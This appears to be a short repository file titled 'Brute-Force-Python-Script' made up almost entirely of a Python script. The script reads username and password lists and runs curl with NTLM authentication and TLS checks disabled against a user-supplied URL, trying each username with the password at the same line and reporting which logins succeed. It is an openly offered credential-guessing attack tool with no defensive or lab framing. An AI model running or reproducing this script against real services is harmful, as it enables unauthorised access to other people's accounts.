# Brute-Force-Python-Script

#!/usr/bin/python
import subprocess

# Read usernames and passwords from files
try:
    with open("usernames.txt", "r") as user_file:
        users = user_file.read().splitlines()
except FileNotFoundError:
    print("Error: usernames.txt not found.")
    exit(1)

try:
    with open("passwords.txt", "r") as pass_file:
        passwords = pass_file.read().splitlines()
except FileNotFoundError:
    print("Error: passwords.txt not found.")
    exit(1)

if not users or not passwords:
    print("Error: Usernames or passwords list is empty.")
    exit(1)

i = 0

# Prompt the user for the URL during runtime
url = input("Enter the target URL: ")
domain = ""
cmd = ["curl", "-k", "--ntlm", "-u"]

for user in users:
    print("Attempting: " + domain + user.lower() + ":" + passwords[i])

    # Construct the command as a list
    full_cmd = cmd + [domain + user.lower() + ":" + passwords[i], url]

    # Use subprocess to run the command and capture output
    process = subprocess.Popen(full_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()

    # Check if the process was successful and if the output contains success indicators
    if process.returncode == 0 and b'Success' in output:
        print("Success: Authentication successful for " + user.lower())
    else:
        print("Failure: Authentication failed for " + user.lower())

    i += 1
